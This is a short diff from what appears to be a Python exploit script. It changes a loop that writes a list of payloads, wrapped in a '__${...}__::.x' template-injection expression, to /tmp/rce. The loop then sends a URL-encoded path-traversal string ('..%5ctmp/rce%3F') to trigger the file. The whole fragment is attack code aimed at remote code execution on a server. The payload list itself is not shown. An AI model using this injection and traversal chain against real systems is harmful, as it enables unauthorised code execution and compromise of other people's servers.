@@ -721,7 +721,7 @@ all_payloads = [
 ]
 for payload in all_payloads:
     c.file_write(
-        data="__${%s}__::.x"% payload,
+        data="__$\{\%s\}__::.x"% payload,
         path=f"/tmp/rce"
     )
     c.notify(payload='..%5ctmp/rce%3F')
